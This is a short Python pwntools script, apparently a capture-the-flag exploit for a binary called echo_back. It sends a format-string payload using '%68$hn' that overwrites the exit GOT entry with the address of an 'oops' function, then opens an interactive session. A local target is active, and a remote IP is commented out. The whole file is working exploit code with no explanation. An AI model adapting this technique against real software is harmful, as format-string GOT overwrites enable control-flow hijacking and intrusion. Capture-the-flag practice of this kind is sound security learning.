from pwn import *
import struct


# Compile using: gcc -o echo_back echo_back.c -no-pie

p = remote('127.0.0.1', 1024)
# p = remote("3.142.26.175", 12346)
# p = process("./pwn2")
message = p.recv()
print(message)

input("attach gdb")


exit_val = 0x4010e0
exit_addr = 0x404070
oops_addr = 0x40134f

def pad(s):
    return s + b"X"*(512 - len(s) - 16)

payload = b''
# payload += b" %p "*68
payload += "%{}x".format(0x134f - len(payload)).encode()
payload += b"%68$hn"
payload = pad(payload)
payload += p64(exit_addr)
payload += p64(exit_addr + 2)
payload = pad(payload)
# print(payload.decode("utf-8"))

p.sendline(payload)

p.interactive()
